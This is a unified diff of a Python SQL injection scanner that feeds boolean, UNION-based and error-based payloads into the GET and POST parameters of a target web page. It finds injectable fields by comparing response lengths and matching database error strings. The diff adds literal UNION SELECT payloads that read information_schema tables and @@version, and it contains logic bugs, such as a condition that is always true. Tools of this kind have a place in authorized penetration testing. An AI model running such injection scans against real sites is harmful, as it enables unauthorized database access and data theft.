@@ -27,8 +27,6 @@ def make_POST_form(url: str, data: dict):
 
 
 def get_request(data, dic, target, cookies):
-    True_for_test = None
-
     key_list = list(dic.keys())
     for payload_name in key_list:
         tmp = dic
@@ -46,88 +44,76 @@ def get_request(data, dic, target, cookies):
         with open(os.path.dirname(os.path.realpath(__file__)) + '/sql_boolean.txt', "r", encoding='UTF8') as bool:
             data = bool.readlines()
         
-        for payload in data:
+        for i,payload in enumerate(data):
             try:
                 true_payload, false_payload = payload.split('\t')
-                test_form1 = bool_middle_form.replace('@@@@@@', true_payload.strip()) #true
-                form1_res = requests.get(test_form1,cookies=cookies)
-                test_form2 = bool_middle_form.replace('@@@@@@', false_payload.strip()) #false
-                form2_res = requests.get(test_form2,cookies=cookies)
-                if (abs(len(form1_res.text) - len(form2_res.text)) > 20) or (str(BeautifulSoup(form1_res.text,"html.parser"))!= str(BeautifulSoup(form2_res.text,"html.parser"))):
+                if i <= 8:
+                    test_form1 = bool_middle_form.replace('@@@@@@', true_payload.rstrip()) #true
+                    form1_res = requests.get(test_form1,cookies=cookies)
+                    #print(test_form1)
+                    test_form2 = bool_middle_form.replace('@@@@@@', false_payload.rstrip()) #false
+                    form2_res = requests.get(test_form2,cookies=cookies)
+                    #print(test_form2)
+                else:
+                    test_form1 = bool_middle_form.replace(tmp[payload_name], true_payload.rstrip()) #true
+                    form1_res = requests.get(test_form1,cookies=cookies)
+                    #print(test_form1)
+                    test_form2 = bool_middle_form.replace(tmp[payload_name], false_payload.rstrip()) #false
+                    form2_res = requests.get(test_form2,cookies=cookies)
+                    #print(test_form2)
+                if ( abs(len(form1_res.text) - len(form2_res.text)) > 20 ):
                     True_for_test = str(BeautifulSoup(form1_res.text,"html.parser"))
                     print('find on 1')
                     return make_GET_form(test_form2)
+
             except:
                 time.sleep(2)     
-        
+
         #union
         union_middle_form = middle_form
-        union_target = target
-
         if col_num('get',union_middle_form, cookies) != False:
             col, payload = col_num('get',union_middle_form, cookies)
-            table_payload = payload
             #NON blind get table info
-            try:
-                origin = requests.get(union_target,cookies=cookies).text
-                if col == 1:
-                    table_form = union_middle_form.replace('@@@@@@', quote('\' union select table_schema from information_schema.tables #'))
-                    table_res = requests.get(table_form,cookies=cookies)
-                    if abs(len(table_res.text) - len(origin)) >70:
-                        print('find on 2')
-                        return make_GET_form(table_form)
-                elif col ==2:
-                    table_form = union_middle_form.replace('@@@@@@', quote('\' union select table_name,table_schema from information_schema.tables #'))
-                    table_res = requests.get(table_form,cookies=cookies)
-                    if abs(len(table_res.text) - len(origin)) >75:
-                        print('find on 3')
-                        return make_GET_form(table_form)
-                    elif str(BeautifulSoup(table_res.text,"html.parser")) == True_for_test:
-                        print('find on 4')
-                        return make_GET_form(table_form)
-                else:
-                    table_payload = table_payload.replace('2','table_name')
-                    table_payload = table_payload.replace(col,'\' union select table_name,table_schema from information_schema.tables ')
-                    table_form = union_middle_form.replace('@@@@@@', quote(table_payload))
-                    table_res = requests.get(table_form,cookies=cookies)
-                    if abs(len(table_res.text) - len(origin)) >75:
-                        print('find on 5')
-                        return make_GET_form(table_form)
-            except:
-                time.sleep(2)
-            #version
-            ver_payload = payload
-            for i in range(1,col):
-                check_version = {"@@version", "version()","NULL FROM v$version--"}
-                for version in check_version:
-                    if version == 'NULL FROM v$version--':
-                        ver_payload.replace('1','banner')
-                        if col == 1:
-                            ver_payload = ver_payload + ' FROM v$version--'
-                        else:
-                            ver_payload = ver_payload.replace(str(i),version)
-                    else:
-                        ver_payload = ver_payload.replace(str(i),version)
-                    ver_form = union_middle_form.replace('@@@@@@', quote(ver_payload))
-                    try:
+            for payload in data:
+                try:
+                    #' or 1=1 union select table_name,null from information_schema.columns#
+                    true_payload, false_payload = payload.split('\t')
+                    check_list = {"ubuntu","SQL Server","Microsoft SQL Server","Oracle","Postre SQL", "MSSQL", "Microsoft JET Database Engine", "ORA-00933:","PSQLException"}
+                    if true_payload.startswith('admin'):
+                        break
+                    if col == 1:
+                        table_form = union_middle_form.replace('@@@@@@', quote(true_payload.strip()+' union select null from information_schema.tables #'))
+                        table_res = requests.get(table_form,cookies=cookies)
+                        ver_form = union_middle_form.replace('@@@@@@', quote(true_payload.strip()+' union select @@version#'))
                         ver_res = requests.get(ver_form,cookies=cookies)
-                        #check with db name
-                        check_list = {"SQL Server","ubuntu","SQL Server","Microsoft SQL Server","Oracle","Postre SQL", "MSSQL", "Microsoft JET Database Engine", "ORA-00933:","PSQLException"}
                         for wrd in check_list:
                             if re.search(wrd, ver_res.text):
-                                print('find on 6')
+                                print('find on 6-1')
                                 return make_GET_form(ver_form)
-                        #check with number of characters
-                        if abs(len(ver_res.text) - len(origin)) >40:
-                            print('find on 7')
-                            return make_GET_form(ver_form)
-                    except:
-                        time.sleep(2)
+                    elif col ==2:
+                        table_form = union_middle_form.replace('@@@@@@', quote(true_payload.strip()+' union select @@version,null from information_schema.columns#'))
+                        table_res = requests.get(table_form,cookies=cookies)
+                    else:
+                        table_payload = ", null"*(col-2)
+                        table_form = union_middle_form.replace('@@@@@@', quote(true_payload.strip()+' union select table_name, @@version'+table_payload+' from information_schema.tables #'))
+                        table_res = requests.get(table_form,cookies=cookies)
+                    
+                    for wrd in check_list:
+                        if re.search(wrd, table_res.text):
+                            print('find on 6-2')
+                            return make_GET_form(table_form)
+                except:
+                    time.sleep(2)
+ 
         #error
+        err_middle_form = middle_form
         with open(os.path.dirname(os.path.realpath(__file__)) + '/sql.txt', "r", encoding='UTF8') as err_file:
             err_data = err_file.readlines()
-        for payload in err_data:
-            final_form = middle_form.replace('@@@@@@', payload.strip())
+        for j,payload in enumerate(err_data):
+            if j <= 56:
+                final_form = err_middle_form.replace('@@@@@@', payload.rstrip())
+            else:
+                final_form = err_middle_form.replace(tmp[payload_name], payload.rstrip())
             try:
                 test_res = requests.get(final_form, cookies=cookies)
                 if check_success(str(BeautifulSoup(test_res.text,"html.parser"))):
@@ -215,7 +201,6 @@ def col_num(arg1, arg2, cookies):
     return False
 
 def scan_type1(url: str, params: dict, cookies):
-    true_res = None
 
     with open(os.path.dirname(os.path.realpath(__file__)) + '/sql.txt', "r", encoding='UTF8') as f:
         data = f.readlines()
@@ -236,126 +221,81 @@ def scan_type1(url: str, params: dict, cookies):
             #error_based
             for payload_name in key_list:
                 query_error = dic.copy()
-                for payload in data:
+                for m,payload in enumerate(data):
                     try:
-                        query_error[payload_name]=tmp[payload_name]+payload.strip()
+                        if m <= 56:
+                            query_error[payload_name]=tmp[payload_name]+payload.rstrip()
+                        else:
+                            query_error[payload_name]=payload.rstrip() 
                         test_res = requests.post(target, data=query_error, cookies=cookies)
+                        print(query_error)
                         if check_success(str(BeautifulSoup(test_res.text,"html.parser"))):
                             print('find on 9')
                             return make_POST_form(target, query_error)
                     except:
                         time.sleep(2)
+                        
                 #boolean
                 test_form1=dic.copy()
                 test_form1[payload_name] = tmp[payload_name]+'@@@@@@'
                 test_form2=dic.copy()
 
-                for bool_pay in bool_data:
+                for n,bool_pay in enumerate(bool_data):
                     try:
                         true_payload, false_payload = bool_pay.split('\t')
                         test_form1[payload_name] = test_form1[payload_name].replace('@@@@@@',true_payload.strip()) #true
                         form1_post = requests.post(target,data=test_form1,cookies=cookies)
-                        test_form1[payload_name] = test_form1[payload_name].replace(true_payload.strip(),'@@@@@@')
+                        #print(test_form1)
+                        test_form1[payload_name] = test_form1[payload_name].replace(true_payload.rstrip(),'@@@@@@')
                         test_form2[payload_name] = test_form1[payload_name].replace('@@@@@@',false_payload.strip()) #false
                         form2_post = requests.post(target,data=test_form2,cookies=cookies)
-                        test_form1[payload_name] = test_form2[payload_name].replace(false_payload.strip(),'@@@@@@')
-                        if (abs(len(str(BeautifulSoup(form1_post.text,"html.parser")))-len(str(BeautifulSoup(form2_post.text,"html.parser"))))>20) or (str(BeautifulSoup(form1_post.text,"html.parser"))!=str(BeautifulSoup(form2_post.text,"html.parser"))):
-                            true_res = str(BeautifulSoup(form1_post.text,"html.parser"))
+                        #print(test_form2)
+                        test_form1[payload_name] = test_form2[payload_name].replace(false_payload.rstrip(),'@@@@@@')
+
+                        if (abs(len(str(BeautifulSoup(form1_post.text,"html.parser")))-len(str(BeautifulSoup(form2_post.text,"html.parser"))))>20) :
                             print('find on 10')
                             return make_POST_form(target, test_form2)
+
                     except:
                         time.sleep(2)
             
             #union
             table_form=dic.copy()
-            ver_tmp = dic.copy()
-            try:
-                origin = requests.post(target,data=dic,cookies=cookies).text
-            except:
-                time.sleep(2)
-                try:
-                    origin = requests.post(target,data=dic,cookies=cookies).text
-                except:
-                    return False
-                
+            tmp_form = dic.copy()                
 
             if col_num(target, table_form, cookies) != False:
-                col, tmp_payload,col_form= col_num(target, table_form. cookies)
-                union_payload = tmp_payload
-                
+                col, tmp_payload,col_form= col_num(target, table_form,cookies)
                 for payload_name in key_list:
-                    try:
-                        if col ==1:
-                            table_form[payload_name] = table_form[payload_name]+'\' union select table_schema from information_schema.tables #'
-                            table_res = requests.post(target,data=table_form,cookies=cookies)
-                            if abs(len(table_res.text) - len(origin)) >70:
-                                print('find on 11')
-                                return make_POST_form(target, table_form)
+                    for bool_pay in bool_data:
+                        try:
+                            true_payload, false_payload = bool_pay.split('\t')
+                            check_list = {"root","admin","ubuntu","SQL Server","Microsoft SQL Server","Oracle","Postre SQL", "MSSQL", "Microsoft JET Database Engine", "ORA-00933:","PSQLException"}
+                            if true_payload.startswith('admin'):
+                                break
+                        
+                            if col ==1:
+                                table_form[payload_name] = tmp_form[payload_name]+true_payload.strip()+' union select null from information_schema.tables #'
+                                table_res = requests.post(target,data=table_form,cookies=cookies)
+                            elif col ==2:
+                                table_form[payload_name] = tmp_form[payload_name]+true_payload.strip()+' union select @@version,null from information_schema.columns#'
+                                table_res = requests.post(target,data=table_form,cookies=cookies)
                             else:
-                                if str(BeautifulSoup(table_res.text,"html.parser")) == true_res:
-                                    print('find on 12')
+                                table_payload = ", null"*(col-2)
+                                table_form[payload_name] = tmp_form[payload_name]+true_payload.strip()+' union select table_name, @@version'+table_payload+' from information_schema.tables #'
+                                table_res = requests.post(target,data=table_form,cookies=cookies)
+                            
+                            #if you can see result
+                            for wrd in check_list:
+                                if re.search(wrd, table_res.text):
+                                    print('find on 9')
                                     return make_POST_form(target, table_form)
-                        elif col ==2:
-                            table_form[payload_name] = table_form[payload_name]+'\' union select table_name,table_schema from information_schema.tables #'
-                            table_res = requests.post(target,data=table_form,cookies=cookies)
-                            if abs(len(table_res.text) - len(origin)) >75:
-                                print('find on 13')
-                                return make_POST_form(target, table_form)
-                            else:
-                                if str(BeautifulSoup(table_res.text,"html.parser")) == true_res:
-                                    print('find on 14')
-                                    return make_POST_form(target, table_form)
-                        else:
-                            union_payload = union_payload.replace('2','table_name')
-                            union_payload = union_payload.replace(col,'\' union select table_name,table_schema from information_schema.tables ')
-                            table_form[payload_name] = table_form[payload_name].replace(table_form[payload_name], union_payload)
-                            table_res = table_res = requests.post(target,data=table_form,cookies=cookies)
-                            if abs(len(table_res.text) - len(origin)) >(75+col):
-                                print('find on 15')
-                                return make_POST_form(target, table_form)
-                            else:
-                                if str(BeautifulSoup(table_res.text,"html.parser")) == true_res:
-                                    print('find on 16')
-                                    return make_POST_form(target, table_form)
-                    except:
-                        time.sleep(2)
-                
-                ver_payload = tmp_payload
-                for payload_name in key_list:
-                    for j in range(1,col):
-                        check_version = {"@@version", "version()","NULL FROM v$version--"}
-                        for version in check_version:
-                            if version == 'NULL FROM v$version--':
-                                ver_payload.replace('1','banner')
-                                if col == 1:
-                                    ver_payload = ver_payload + ' FROM v$version--'
-                                else:
-                                    ver_payload = ver_payload.replace(str(j),version)
-                            else:
-                                ver_payload = ver_payload.replace(str(j),version)
+                        except:
+                            time.sleep(2)
 
-                            ver_form = ver_tmp
-                            ver_form[payload_name] = ver_tmp[payload_name].replace(ver_tmp[payload_name], ver_payload)
-                            try:
-                                ver_res = requests.post(target ,data=ver_form ,cookies=cookies)
-                                #check with db name
-                                check_list = {"SQL Server","ubuntu","SQL Server","Microsoft SQL Server","Oracle","Postre SQL", "MSSQL", "Microsoft JET Database Engine", "ORA-00933:","PSQLException"}
-                                for wrd in check_list:
-                                    if re.search(wrd, ver_res.text):
-                                        print('find on 17')
-                                        return make_POST_form(target, ver_form)
-                                #check with number of characters
-                                if abs(len(ver_res.text) - len(origin)) >40:
-                                    print('find on 18')
-                                    return make_POST_form(target, ver_form)
-                            except:
-                                time.sleep(2)
-                
-
-                    if 'UNION' or 'union' in col_form[payload_name]:
-                        col_form[payload_name] = tmp_payload
-                        print('find on 19')
-                        return make_POST_form(target, col_form)
+                if 'UNION' or 'union' in col_form[payload_name]:
+                    col_form[payload_name] = tmp_payload
+                    print('find on 19')
+                    return make_POST_form(target, col_form)
 
         elif method == 'get':
             return get_request(data, dic, target, cookies)
@@ -383,7 +323,7 @@ def scan_type2(url: str, cookies):
     return get_request(data, dic, target, cookies)
 
 def check_success(res):         
-    check_list = {"SQL syntax","valid MySQL","warning: mysql","ODBC Microsoft Access Driver","java.sql.SQLException","XPathException","valid ldap","javax.naming.NameNotFoundException","unclosed quotation mark after the character string", "quoted string not properly terminated","SQL Server","syntax error","XPATH syntax error","OLE DB provider","Microsoft SQL Server","OleDb.OleDbException","Microsoft SQL Native Client error"}
+    check_list = {"SQL syntax","valid MySQL","warning: mysql","ODBC Microsoft Access Driver","java.sql.SQLException","XPathException","valid ldap","javax.naming.NameNotFoundException","unclosed quotation mark after the character string", "quoted string not properly terminated","SQL Server","syntax error","XPATH syntax error","OLE DB provider","Microsoft SQL Server","OleDb.OleDbException","Microsoft SQL Native Client error","ubuntu","Microsoft SQL Server","Oracle","Postre SQL", "MSSQL", "Microsoft JET Database Engine", "ORA-00933:","PSQLException"}
     for wrd in check_list:
         if re.search(wrd, res):
             return True
